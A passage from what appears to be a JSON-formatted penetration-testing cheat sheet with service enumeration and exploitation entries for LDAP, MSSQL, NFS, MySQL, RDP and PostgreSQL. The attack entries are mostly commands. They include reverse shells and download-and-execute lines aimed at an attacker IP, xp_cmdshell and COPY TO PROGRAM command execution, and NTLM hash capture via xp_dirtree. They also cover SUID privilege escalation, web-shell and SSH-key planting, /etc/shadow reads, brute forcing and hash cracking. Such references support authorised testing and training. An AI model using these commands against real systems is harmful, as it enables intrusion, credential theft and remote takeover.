                    "    ldapsearch -x -H \"ldap://$ip\" -D '' -w '' -b \"$dc_string\"",
                    "    ldapsearch -h \"$ip\" -x -b \"$dc_string\"",
                    "else",
                    "    ldapsearch -x -H \"ldap://$ip\" -D \"$username\" -w \"$password\" -b \"$dc_string\"",
                    "fi",
                    "",
                    "read -p \"Run common extractions? (y/n): \" do_enum",
                    "",
                    "if [[ \"$do_enum\" == \"y\" ]]; then",
                    "    function run_section() {",
                    "        local header=\"$1\"",
                    "        local base_dn=\"$2\"",
                    "        echo -e \"\\n=======$header =======\"",
                    "        ldapsearch -x -H \"ldap://$ip\" -D \"$username\" -w \"$password\" -b \"$base_dn\"",
                    "    }",
                    "",
                    "    base_dc=\"$dc_string\"",
                    "    run_section \"Extracting Users\" \"CN=Users,$base_dc\"",
                    "    run_section \"Extracting Computers\" \"CN=Computers,$base_dc\"",
                    "    my_cn=$(echo \"$username\" | cut -d'\\\\' -f2)",
                    "    run_section \"Extracting Info of$my_cn\" \"CN=$my_cn,CN=Users,$base_dc\"",
                    "    run_section \"Extracting Domain Admins\" \"CN=Domain Admins,CN=Users,$base_dc\"",
                    "    run_section \"Extracting Domain Users\" \"CN=Domain Users,CN=Users,$base_dc\"",
                    "    run_section \"Extracting Enterprise Admins\" \"CN=Enterprise Admins,CN=Users,$base_dc\"",
                    "    run_section \"Extracting Administrators\" \"CN=Administrators,CN=Builtin,$base_dc\"",
                    "    run_section \"Extracting Remote Desktop Group\" \"CN=Remote Desktop Users,CN=Builtin,$base_dc\"",
                    "fi",
                    "",
                    "read -p \"Query a specific OU? (y/n): \" do_ou",
                    "",
                    "if [[ \"$do_ou\" == \"y\" ]]; then",
                    "    read -p \"Enter OU path (e.g. domain.local,computersexample,subscompexample): \" ou_input",
                    "    IFS=',' read -ra parts <<< \"$ou_input\"",
                    "    ou_string=\"\"",
                    "    for i in \"${!parts[@]}\"; do",
                    "        if [[ \"$i\" -lt $((${#parts[@]} - ${#domain_parts[@]})) ]]; then",
                    "            ou_string=\"CN=${parts[i]},$ou_string\"",
                    "        fi",
                    "    done",
                    "    for part in \"${domain_parts[@]}\"; do",
                    "        ou_string+=\"DC=$part,\"",
                    "    done",
                    "    ou_string=\"${ou_string%,}\"",
                    "",
                    "    echo -e \"\\n======= Custom OU Query:$ou_string =======\"",
                    "    if [[ \"$auth_type\" == \"null\" ]]; then",
                    "        ldapsearch -x -H \"ldap://$ip\" -D '' -w '' -b \"$ou_string\"",
                    "    else",
                    "        ldapsearch -x -H \"ldap://$ip\" -D \"$username\" -w \"$password\" -b \"$ou_string\"",
                    "    fi",
                    "fi",
                    "",
                    "echo -e \"\\n=== Script Complete ===\""
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] Anonymous/null bind allowed?",
                    "# [ ] Naming contexts discovered?",
                    "# [ ] Users, computers, and groups enumerated?",
                    "# [ ] User descriptions reveal cleartext passwords?",
                    "# [ ] Service accounts with SPNs found? (for Kerberoasting)",
                    "# [ ] Group Policy Objects accessible?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-20",
          "name": "MSSQL Enumeration (1433)",
          "description": "Microsoft SQL Server runs on TCP port 1433 (default) and UDP port 1434 (SQL Browser service for instance discovery). MSSQL is one of the highest-value targets in an engagement because xp_cmdshell provides direct OS command execution as the SQL service account (often NT SERVICE\\MSSQLSERVER or SYSTEM). Key attack vectors include default/weak credentials, xp_cmdshell RCE, NTLM hash theft via xp_dirtytree, linked server abuse, and privilege escalation via impersonation. Tip: If you find MSSQL with valid credentials, xp_cmdshell is often the fastest path to a shell. Even if disabled, you can re-enable it if you have sysadmin privileges.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-brute <TARGET-IP>"
                  ]
                },
                {
                  "cmd": [
                    "# Discover MSSQL instances via UDP Browser service",
                    "nmap -sU -p 1434 --script ms-sql-info <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting to MSSQL",
              "entries": [
                {
                  "cmd": [
                    "# With password",
                    "impacket-mssqlclient <USER>:<PASSWORD>@<TARGET-IP>",
                    "impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET-IP> -windows-auth",
                    "",
                    "# With NTLM hash",
                    "impacket-mssqlclient <USER>@<TARGET-IP> -hashes :<NTLM-HASH> -windows-auth"
                  ],
                  "subdesc": "Impacket-mssqlclient (Preferred)"
                },
                {
                  "cmd": [
                    "sqsh -S <TARGET-IP> -U <USER> -P <PASSWORD>",
                    "sqsh -S <TARGET-IP> -U <DOMAIN>\\\\<USER> -P <PASSWORD>"
                  ],
                  "subdesc": "sqsh"
                }
              ]
            },
            {
              "desc": "Information Gathering",
              "entries": [
                {
                  "cmd": [
                    "-- Server version and info",
                    "SELECT @@version;",
                    "",
                    "-- Current user",
                    "SELECT SYSTEM_USER;",
                    "SELECT USER_NAME();",
                    "",
                    "-- Check if sysadmin",
                    "SELECT IS_SRVROLEMEMBER('sysadmin');",
                    "",
                    "-- List all databases",
                    "SELECT name FROM sys.databases;",
                    "",
                    "-- List all logins",
                    "SELECT name, type_desc FROM sys.server_principals;",
                    "",
                    "-- Current database",
                    "SELECT DB_NAME();",
                    "",
                    "-- Switch database",
                    "USE <database_name>;",
                    "",
                    "-- List tables",
                    "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;",
                    "",
                    "-- Dump a table",
                    "SELECT * FROM <table_name>;"
                  ]
                }
              ]
            },
            {
              "desc": "xp_cmdshell — OS Command Execution",
              "entries": [
                {
                  "subdesc": "The #1 attack vector on MSSQL. Requires sysadmin privileges.",
                  "cmd": [
                    "-- Check if xp_cmdshell is enabled",
                    "EXEC sp_configure 'show advanced options';",
                    "",
                    "-- Enable xp_cmdshell",
                    "EXEC sp_configure 'show advanced options', 1;",
                    "RECONFIGURE;",
                    "EXEC sp_configure 'xp_cmdshell', 1;",
                    "RECONFIGURE;",
                    "",
                    "-- Execute OS commands",
                    "EXEC xp_cmdshell 'whoami';",
                    "EXEC xp_cmdshell 'dir C:\\\\';",
                    "EXEC xp_cmdshell 'type C:\\\\Users\\\\Administrator\\\\Desktop\\\\proof.txt';"
                  ]
                },
                {
                  "subdesc": "Reverse Shell via xp_cmdshell — Use a download cradle if needed to shorten the encoded payload.",
                  "cmd": [
                    "-- PowerShell reverse shell (encode if special chars break it)",
                    "EXEC xp_cmdshell 'powershell -e <BASE64-ENCODED-PAYLOAD>';",
                    "",
                    "-- Or download and execute",
                    "EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER-IP>/shell.exe C:\\Windows\\Temp\\shell.exe';",
                    "EXEC xp_cmdshell 'C:\\Windows\\Temp\\shell.exe';"
                  ]
                }
              ]
            },
            {
              "desc": "NTLM Hash Theft (xp_dirtytree / xp_fileexist)",
              "entries": [
                {
                  "subdesc": "Force the SQL server to authenticate to your SMB share, capturing the NTLM hash:",
                  "cmd": [
                    "# On attacker: Start Responder or impacket-smbserver",
                    "sudo responder -I tun0",
                    "# Or:",
                    "impacket-smbserver share . -smb2support"
                  ]
                },
                {
                  "cmd": [
                    "-- On MSSQL: Force authentication to attacker",
                    "EXEC xp_dirtytree '\\\\<ATTACKER-IP>\\share';",
                    "-- Or:",
                    "EXEC xp_fileexist '\\\\<ATTACKER-IP>\\share\\file';"
                  ]
                },
                {
                  "subdesc": "Crack the captured NTLMv2 hash with hashcat:",
                  "cmd": [
                    "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Impersonation",
              "entries": [
                {
                  "subdesc": "If the current user can impersonate another login (often sa):",
                  "cmd": [
                    "-- Check who you can impersonate",
                    "SELECT distinct b.name FROM sys.server_permissions a",
                    "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id",
                    "WHERE a.permission_name = 'IMPERSONATE';",
                    "",
                    "-- Impersonate sa",
                    "EXECUTE AS LOGIN = 'sa';",
                    "",
                    "-- Verify",
                    "SELECT SYSTEM_USER;",
                    "SELECT IS_SRVROLEMEMBER('sysadmin');",
                    "",
                    "-- Now enable xp_cmdshell as sa"
                  ]
                }
              ]
            },
            {
              "desc": "Linked Servers",
              "entries": [
                {
                  "subdesc": "Linked servers allow MSSQL to query other SQL servers. They may have higher privileges:",
                  "cmd": [
                    "-- List linked servers",
                    "EXEC sp_linkedservers;",
                    "SELECT * FROM sys.servers;",
                    "",
                    "-- Execute query on linked server",
                    "SELECT * FROM OPENQUERY([LINKED-SERVER], 'SELECT @@version');",
                    "",
                    "-- Execute xp_cmdshell on linked server",
                    "EXEC ('EXEC sp_configure''show advanced options'', 1; RECONFIGURE;') AT [LINKED-SERVER];",
                    "EXEC ('EXEC sp_configure''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED-SERVER];",
                    "EXEC ('EXEC xp_cmdshell''whoami'';') AT [LINKED-SERVER];"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force MSSQL Credentials",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 1 -vV mssql://<TARGET-IP>",
                    "crackmapexec mssql <TARGET-IP> -u users.txt -p passwords.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] MSSQL version identified? (`searchsploit microsoft sql`)",
                    "# [ ] Current user’s role? (sysadmin = game over)",
                    "# [ ] `xp_cmdshell` enabled or can be enabled?",
                    "# [ ] NTLM hash theft via `xp_dirtytree`?",
                    "# [ ] Impersonation possible?",
                    "# [ ] Linked servers present?",
                    "# [ ] Interesting data in databases? (credentials, hashes)",
                    "# [ ] Default credentials work? (`sa:sa`, `sa:` blank)"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Connection",
              "entries": [
                {
                  "cmd": [
                    "# Impacket (preferred — supports Windows auth)",
                    "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET-IP> -windows-auth",
                    "impacket-mssqlclient <USER>:<PASS>@<TARGET-IP>",
                    "",
                    "# sqsh",
                    "sqsh -S <TARGET-IP> -U <USER> -P <PASS>"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Enumeration",
              "entries": [
                {
                  "cmd": [
                    "-- Version",
                    "SELECT @@version;",
                    "",
                    "-- Current user and roles",
                    "SELECT SYSTEM_USER;",
                    "SELECT IS_SRVROLEMEMBER('sysadmin');",
                    "",
                    "-- List all databases",
                    "SELECT name FROM sys.databases;",
                    "",
                    "-- Use a database and list tables",
                    "USE <database>;",
                    "SELECT * FROM INFORMATION_SCHEMA.TABLES;",
                    "",
                    "-- Dump table contents",
                    "SELECT * FROM <database>.dbo.<table>;",
                    "",
                    "-- List all logins",
                    "SELECT name, type_desc, is_disabled FROM sys.server_principals;",
                    "",
                    "-- Check linked servers (lateral movement!)",
                    "EXEC sp_linkedservers;",
                    "SELECT * FROM openquery(<LINKED-SERVER>, 'SELECT @@version');",
                    "-- Execute commands on the linked server:",
                    "EXEC ('xp_cmdshell''whoami''') AT [<LINKED-SERVER>];"
                  ]
                }
              ]
            },
            {
              "desc": "Database — xp_cmdshell (Command Execution)",
              "entries": [
                {
                  "cmd": [
                    "-- Enable xp_cmdshell (requires sysadmin)",
                    "EXEC sp_configure 'show advanced options', 1;",
                    "RECONFIGURE;",
                    "EXEC sp_configure 'xp_cmdshell', 1;",
                    "RECONFIGURE;",
                    "",
                    "-- Execute commands",
                    "EXEC xp_cmdshell 'whoami';",
                    "EXEC xp_cmdshell 'dir C:\\Users';",
                    "EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\proof.txt';"
                  ]
                }
              ]
            },
            {
              "desc": "Database — NTLM Hash Theft via xp_dirtree",
              "entries": [
                {
                  "subdesc": "Purpose: Force the SQL server to authenticate to your SMB server, capturing the service account’s NTLMv2 hash. Start Responder or impacket-smbserver first.",
                  "cmd": [
                    "-- Start Responder on attacker: sudo responder -I tun0",
                    "-- Or: impacket-smbserver share . -smb2support",
                    "",
                    "-- Force NTLM authentication to your attacker IP",
                    "EXEC xp_dirtree '\\\\<ATTACKER-IP>\\share';",
                    "",
                    "-- Alternative methods",
                    "EXEC master..xp_subdirs '\\\\<ATTACKER-IP>\\share';",
                    "EXEC master..xp_fileexist '\\\\<ATTACKER-IP>\\share\\test';"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Linked Servers (Lateral Movement)",
              "entries": [
                {
                  "subdesc": "When to check: Always run EXEC sp_linkedservers; — linked servers often have elevated permissions and allow pivoting to other database servers or even domain controllers.",
                  "cmd": [
                    "-- List linked servers",
                    "EXEC sp_linkedservers;",
                    "",
                    "-- Query a linked server",
                    "SELECT * FROM openquery([<LINKED-SERVER>], 'SELECT @@version');",
                    "SELECT * FROM openquery([<LINKED-SERVER>], 'SELECT name FROM sys.databases');",
                    "",
                    "-- Enable and execute xp_cmdshell on a linked server",
                    "EXEC ('sp_configure''show advanced options'', 1; RECONFIGURE;') AT [<LINKED-SERVER>];",
                    "EXEC ('sp_configure''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED-SERVER>];",
                    "EXEC ('xp_cmdshell''whoami''') AT [<LINKED-SERVER>];"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-21",
          "name": "NFS Enumeration (2049)",
          "description": "NFS (Network File System) runs on TCP/UDP port 2049 and allows remote file system mounting over a network. Misconfigured NFS exports with wildcard access (*) or no root_squash can allow attackers to read sensitive files, write malicious content, or escalate privileges by manipulating file ownership. Tip: NFS with no_root_squash is a classic privilege escalation vector. If you can mount a share as root, you can place a SUID binary that the target will execute as root.",
          "commands": [
            {
              "desc": "Enumerate NFS Exports",
              "entries": [
                {
                  "subdesc": "List all exported shares and their access permissions:",
                  "cmd": [
                    "showmount -e <TARGET-IP>"
                  ]
                },
                {
                  "subdesc": "Nmap alternative:",
                  "cmd": [
                    "nmap -sV -p 2049 --script=nfs-showmount,nfs-ls,nfs-statfs <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Mounting NFS Shares",
              "entries": [
                {
                  "cmd": [
                    "# Create a local mount point",
                    "mkdir nfstarget",
                    "",
                    "# Mount the remote share",
                    "sudo mount -t nfs <TARGET-IP>:/mnt/backups/ nfstarget -o nolock"
                  ]
                },
                {
                  "cmd": [
                    "sudo umount nfstarget"
                  ],
                  "subdesc": "Unmounting"
                }
              ]
            },
            {
              "desc": "Privilege Escalation via NFS",
              "entries": [
                {
                  "subdesc": "If the export has no_root_squash enabled: 1. Mount the share as root on your attacker machine 2. Copy a SUID shell:",
                  "cmd": [
                    "cp /bin/bash nfstarget/bash_suid",
                    "chmod +s nfstarget/bash_suid"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] NFS exports listed? (`showmount -e`)",
                    "# [ ] Wildcard access () on any exports?",
                    "# [ ] `no_root_squash` enabled? (privesc vector)",
                    "# [ ] Sensitive files in mounted shares? (configs, SSH keys, backups)",
                    "# [ ] Writable shares? (plant SUID binaries or SSH keys)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-22",
          "name": "MySQL Enumeration (3306)",
          "description": "MySQL runs on TCP port 3306 and is the most common open-source relational database. In penetration testing, MySQL is valuable for credential harvesting from databases, User Defined Function (UDF) RCE, file read/write via LOAD_FILE and INTO OUTFILE, and password hash extraction. MySQL is frequently found alongside web applications (LAMP stack). Tip: If you find MySQL credentials (often in web app config files like wp-config.php, .env, or config.php), connect and look for password hashes, other credentials, or file write capabilities.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -p 3306 --script mysql-info,mysql-enum,mysql-brute TARGET-IP"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting to MySQL",
              "entries": [
                {
                  "cmd": [
                    "# Remote connection",
                    "mysql -h TARGET-IP -u USER -p",
                    "",
                    "# With password inline",
                    "mysql -h TARGET-IP -u root -p'PASSWORD'",
                    "",
                    "# Specify database",
                    "mysql -h TARGET-IP -u USER -p -D DATABASE"
                  ]
                }
              ]
            },
            {
              "desc": "Information Gathering",
              "entries": [
                {
                  "cmd": [
                    "-- Server version",
                    "SELECT @@version;",
                    "SELECT version();",
                    "",
                    "-- Current user",
                    "SELECT user();",
                    "SELECT current_user();",
                    "",
                    "-- All users and password hashes",
                    "SELECT user, host, authentication_string FROM mysql.user;",
                    "",
                    "-- User privileges",
                    "SHOW GRANTS;",
                    "SHOW GRANTS FOR 'USER'@'HOST';",
                    "",
                    "-- List all databases",
                    "SHOW DATABASES;",
                    "",
                    "-- Switch database",
                    "USE database_name;",
                    "",
                    "-- List tables",
                    "SHOW TABLES;",
                    "",
                    "-- Describe table structure",
                    "DESCRIBE table_name;",
                    "",
                    "-- Dump table",
                    "SELECT * FROM table_name;",
                    "",
                    "-- Search for credential columns across all tables",
                    "SELECT table_schema, table_name, column_name FROM information_schema.columns",
                    "WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%user%';"
                  ]
                }
              ]
            },
            {
              "desc": "File Read (LOAD_FILE)",
              "entries": [
                {
                  "subdesc": "Read local files if the MySQL user has the FILE privilege:",
                  "cmd": [
                    "-- Check FILE privilege",
                    "SHOW GRANTS;",
                    "",
                    "-- Read files",
                    "SELECT LOAD_FILE('/etc/passwd');",
                    "SELECT LOAD_FILE('/etc/shadow');",
                    "SELECT LOAD_FILE('/var/www/html/wp-config.php');",
                    "SELECT LOAD_FILE('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts');"
                  ]
                }
              ]
            },
            {
              "desc": "File Write (INTO OUTFILE)",
              "entries": [
                {
                  "subdesc": "Write files to disk. Useful for placing a web shell if you know the web root, or writing an SSH public key.",
                  "cmd": [
                    "-- Write content to a file on the server",
                    "SELECT 'your content here' INTO OUTFILE '/var/www/html/output.txt';",
                    "",
                    "-- Write SSH public key",
                    "SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';"
                  ]
                }
              ]
            },
            {
              "desc": "User Defined Function (UDF) Privilege Escalation",
              "entries": [
                {
                  "subdesc": "If MySQL runs as root, UDF allows loading a shared object for OS command execution:",
                  "cmd": [
                    "# Check MySQL service user",
                    "ps aux | grep mysql",
                    "",
                    "# Find the UDF library (comes with sqlmap or Metasploit)",
                    "locate lib_mysqludf_sys.so",
                    "# Or check: /usr/share/metasploit-framework/data/exploits/mysql/"
                  ]
                },
                {
                  "cmd": [
                    "-- Check plugin directory",
                    "SHOW VARIABLES LIKE 'plugin_dir';",
                    "",
                    "-- Load UDF library (copy it to the plugin dir first)",
                    "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';",
                    "",
                    "-- Execute OS commands",
                    "SELECT sys_exec('id');",
                    "SELECT sys_exec('whoami');"
                  ]
                }
              ]
            },
            {
              "desc": "MySQL Password Hash Cracking",
              "entries": [
                {
                  "cmd": [
                    "# Extract hashes from MySQL",
                    "# SELECT user, authentication_string FROM mysql.user WHERE authentication_string != '';",
                    "",
                    "# Crack with hashcat — MySQL 4.1+ / 5.x+ (double SHA1): mode 300",
                    "hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt",
                    "",
                    "# Crack with john",
                    "john --format=mysql-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
                  ]
                }
              ]
            },
            {
              "desc": "Brute Force MySQL Credentials",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 4 mysql://TARGET-IP"
                  ]
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] MySQL version identified? (searchsploit mysql)",
                    "# [ ] Connected with found/default credentials?",
                    "# [ ] User password hashes extracted?",
                    "# [ ] FILE privilege available? (read/write files)",
                    "# [ ] Web root known? (web shell via INTO OUTFILE)",
                    "# [ ] MySQL running as root? (UDF exploitation)",
                    "# [ ] Credentials found in database tables?",
                    "# [ ] secure_file_priv restriction checked?"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Connection",
              "entries": [
                {
                  "cmd": [
                    "# MySQL",
                    "mysql -u <USERNAME> -p'<PASSWORD>' -h <TARGET-IP> -P 3306",
                    "",
                    "# MariaDB",
                    "mariadb -h <TARGET-IP> -u <USERNAME> -p'<PASSWORD>'",
                    "",
                    "# Skip SSL verification if needed",
                    "mysql -u <USERNAME> -p'<PASSWORD>' -h <TARGET-IP> --skip-ssl-verify-server-cert",
                    "",
                    "# Default credentials to try: root:(blank), root:root, root:toor"
                  ]
                }
              ]
            },
            {
              "desc": "Database — Enumeration",
              "entries": [
                {
                  "cmd": [
                    "-- Version and current user",
                    "SELECT version();",
                    "SELECT user();",
                    "SELECT system_user();",
                    "",
                    "-- List all databases",
                    "SHOW DATABASES;",
                    "",
                    "-- Use a database and list tables",
                    "USE <database>;",
                    "SHOW TABLES;",
                    "",
                    "-- Describe table structure",
                    "DESCRIBE <table>;",
                    "",
                    "-- Dump table contents (use \\G for vertical output)",
                    "SELECT * FROM <table> \\G",
                    "",
                    "-- List all users and password hashes",
                    "SELECT user, host, authentication_string FROM mysql.user;",
                    "",
                    "-- Check current user privileges",
                    "SHOW GRANTS;",
                    "SHOW GRANTS FOR '<USER>'@'<HOST>';",
                    "",
                    "-- Search for interesting data across all tables",
                    "SELECT table_schema, table_name, column_name FROM information_schema.columns",
                    "WHERE column_name LIKE '%pass%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';"
                  ]
                }
              ]
            },
            {
              "desc": "Database — File Read/Write (requires FILE privilege)",
              "entries": [
                {
                  "cmd": [
                    "-- Read a local file",
                    "SELECT LOAD_FILE('/etc/passwd');",
                    "",
                    "-- Write a file (e.g., webshell to web root)",
                    "SELECT \"test\" INTO OUTFILE '/var/www/html/test.txt';",
                    "",
                    "-- Check if FILE privilege is available",
                    "SHOW GRANTS;",
                    "-- Look for: FILE in the grant list"
                  ]
                }
              ]
            },
            {
              "desc": "Database — User Defined Functions (UDF) for Command Execution",
              "entries": [
                {
                  "cmd": [
                    "# If MySQL runs as root and you have FILE privilege:",
                    "# 1. Find the plugin directory",
                    "mysql> SHOW VARIABLES LIKE 'plugin_dir';",
                    "",
                    "# 2. Compile or download the UDF shared object for the target OS",
                    "# 3. Write the .so file to the plugin directory using SELECT INTO DUMPFILE",
                    "# 4. Create the function and execute commands",
                    "",
                    "# Metasploit: exploit/multi/mysql/mysql_udf_payload"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-23",
          "name": "RDP Enumeration (3389)",
          "description": "RDP (Remote Desktop Protocol) runs on TCP port 3389 and provides graphical remote access to Windows systems. For pentesters, RDP enumeration includes vulnerability scanning (BlueKeep, MS12-020), NTLM information extraction, credential brute-forcing, and session hijacking. Tip: If you obtain valid credentials and RDP is open, always try to connect — a full GUI session gives you access to tools like Event Viewer, Registry Editor, and Task Manager for deeper enumeration.",
          "commands": [
            {
              "desc": "Nmap Vulnerability & Info Enumeration",
              "entries": [
                {
                  "subdesc": "Scan for known RDP vulnerabilities and extract NTLM info:",
                  "cmd": [
                    "nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 <TARGET-IP>"
                  ]
                },
                {
                  "cmd": [
                    "nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET-IP>"
                  ],
                  "subdesc": "BlueKeep Check (CVE-2019-0708)"
                },
                {
                  "subdesc": "BlueKeep Check (CVE-2019-0708) — Or use the Metasploit scanner:",
                  "cmd": [
                    "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
                    "set RHOSTS <TARGET-IP>",
                    "run"
                  ]
                }
              ]
            },
            {
              "desc": "RDP Brute Force",
              "entries": [
                {
                  "cmd": [
                    "hydra -L users.txt -P passwords.txt -t 1 rdp://<TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting via RDP",
              "entries": [
                {
                  "cmd": [
                    "xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET-IP> /cert-ignore /dynamic-resolution"
                  ],
                  "subdesc": "xfreerdp (recommended)"
                },
                {
                  "subdesc": "xfreerdp (recommended) — Connect with NTLM hash:",
                  "cmd": [
                    "xfreerdp /u:<USER> /pth:<NTLM-HASH> /v:<TARGET-IP> /cert-ignore"
                  ]
                },
                {
                  "cmd": [
                    "rdesktop -u <USER> -p <PASSWORD> <TARGET-IP>"
                  ],
                  "subdesc": "rdesktop"
                }
              ]
            },
            {
              "desc": "Enumeration Checklist",
              "entries": [
                {
                  "cmd": [
                    "# [ ] RDP version vulnerable? (BlueKeep, MS12-020)",
                    "# [ ] NTLM info reveals domain/hostname?",
                    "# [ ] NLA (Network Level Authentication) enabled? (limits brute force)",
                    "# [ ] Valid credentials allow GUI access?",
                    "# [ ] Can hijack existing sessions? (requires SYSTEM)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "recon-24",
          "name": "PostgreSQL Enumeration (5432)",
          "description": "PostgreSQL runs on TCP port 5432 and is a powerful open-source relational database. For penetration testing, PostgreSQL is valuable because it supports OS command execution via COPY TO PROGRAM, arbitrary file read/write, and large object manipulation for binary file operations. It is commonly found in web application stacks and enterprise environments. Tip: PostgreSQL’s COPY TO PROGRAM is equivalent to MSSQL’s xp_cmdshell — if you have superuser access, you get direct command execution. Look for credentials in web app configs.",
          "commands": [
            {
              "desc": "Nmap Enumeration",
              "entries": [
                {
                  "cmd": [
                    "nmap -sV -p 5432 --script pgsql-brute <TARGET-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Connecting to PostgreSQL",
              "entries": [
                {
                  "cmd": [
                    "# Remote connection",
                    "psql -h <TARGET-IP> -U <USER> -d <DATABASE>",
                    "",
                    "# Default database is 'postgres'",
                    "psql -h <TARGET-IP> -U postgres -d postgres",
                    "",
                    "# With password inline (environment variable)",
                    "PGPASSWORD='<PASSWORD>' psql -h <TARGET-IP> -U <USER> -d <DATABASE>"
                  ]
                }
              ]
            },
            {
              "desc": "Information Gathering",
              "entries": [
                {
                  "cmd": [
                    "-- Server version",
                    "SELECT version();",
                    "",
                    "-- Current user",
                    "SELECT current_user;",
                    "SELECT session_user;",
                    "",
                    "-- Check if superuser",
                    "SELECT current_setting('is_superuser');",
                    "",
                    "-- List all databases",
                    "SELECT datname FROM pg_database;",
                    "-- Or: \\l",
                    "",
                    "-- List all users and roles",
                    "SELECT usename, usesuper FROM pg_user;",
                    "-- Or: \\du",
                    "",
                    "-- Switch database",
                    "\\c <database_name>",
                    "",
                    "-- List tables",
                    "SELECT tablename FROM pg_tables WHERE schemaname = 'public';",
                    "-- Or: \\dt",
                    "",
                    "-- Describe table",
                    "\\d <table_name>",
                    "",
                    "-- Dump table",
                    "SELECT * FROM <table_name>;",
                    "",
                    "-- Search for credential columns",
                    "SELECT table_name, column_name FROM information_schema.columns",
                    "WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%user%';"
                  ]
                }
              ]
            },
            {
              "desc": "OS Command Execution (COPY TO PROGRAM)",
              "entries": [
                {
                  "subdesc": "Requires superuser privileges. This is the primary RCE vector:",
                  "cmd": [
                    "-- Execute OS commands",
                    "COPY (SELECT '') TO PROGRAM 'whoami';",
                    "",
                    "-- Reverse shell",
                    "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1\"';",
                    "",
                    "-- Download and execute",
                    "COPY (SELECT '') TO PROGRAM 'curl http://<ATTACKER-IP>/shell.sh | bash';"
                  ]
                }
              ]
            },
            {
              "desc": "File Read",
              "entries": [
                {
                  "cmd": [
                    "-- Read a file into a table",
                    "CREATE TABLE file_content (content TEXT);",
                    "COPY file_content FROM '/etc/passwd';",
                    "SELECT * FROM file_content;",
                    "DROP TABLE file_content;",
                    "",
                    "-- One-liner using pg_read_file (superuser, PostgreSQL 8.1+)",
                    "SELECT pg_read_file('/etc/passwd');",
                    "",
                    "-- Read binary files using large objects",
                    "SELECT lo_import('/etc/passwd');",
                    "\\lo_list",
                    "SELECT convert_from(lo_get(<OID>), 'UTF-8');"
                  ]
                }
              ]
            },
            {
              "desc": "File Write",
              "entries": [
                {
                  "cmd": [
                    "-- Write to a file",
                    "COPY (SELECT 'web shell content here') TO '/var/www/html/shell.php';",
                    "",
                    "-- Write SSH key",
                    "COPY (SELECT '<SSH-PUBLIC-KEY>') TO '/root/.ssh/authorized_keys';"
                  ]
                }
              ]
            },
            {
              "desc": "Large Objects (Binary File Operations)",
              "entries": [
                {
                  "subdesc": "For binary file exfiltration:",
                  "cmd": [
                    "-- Import a binary file as a large object",
                    "SELECT lo_import('/etc/shadow', 1337);",
                    "",
                    "-- Export large object to a file on the server",
                    "SELECT lo_export(1337, '/tmp/shadow_copy');",
                    "",
                    "-- Read from client side using lo_get",
                    "SELECT encode(lo_get(1337), 'base64');",
                    "",
                    "-- Clean up",
                    "SELECT lo_unlink(1337);"
                  ]
                }
              ]
            },
            {
              "desc": "PostgreSQL Password Hash Cracking",
              "entries": [
                {
